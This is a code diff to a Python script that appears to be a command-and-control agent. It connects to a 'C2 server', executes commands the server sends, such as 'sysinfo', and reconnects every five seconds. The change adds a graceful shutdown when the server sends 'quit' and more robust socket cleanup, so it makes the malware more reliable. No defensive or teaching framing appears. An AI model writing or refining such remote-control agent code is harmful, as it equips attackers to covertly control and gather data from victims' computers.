@@ -84,7 +84,17 @@ def shell():
                 break
                 
             if command == 'quit':
-                break
+                print("[*] Terminating agent...")
+                # Clean shutdown
+                if s:
+                    try:
+                        reliable_send({'status': 'terminating'})
+                        s.shutdown(socket.SHUT_RDWR)
+                        s.close()
+                    except:
+                        pass
+                return  # Exit the shell function
+                
             elif command == 'sysinfo':
                 print(f"[*] Executing: {command}")
                 info = {
@@ -139,17 +149,20 @@ def connect():
             
             print("Connected to C2 server")
             shell()
+            
+            # If shell() returns normally (due to quit command), break the loop
+            print("[*] Agent terminated by server")
             break
             
         except Exception as e:
             print(f"Connection error: {e}")
             if s:
-                s.close()
+                try:
+                    s.close()
+                except:
+                    pass
             time.sleep(5)  # Wait before retrying
             continue
-        finally:
-            if s:
-                s.close()
 
 if __name__ == "__main__":
     while True:
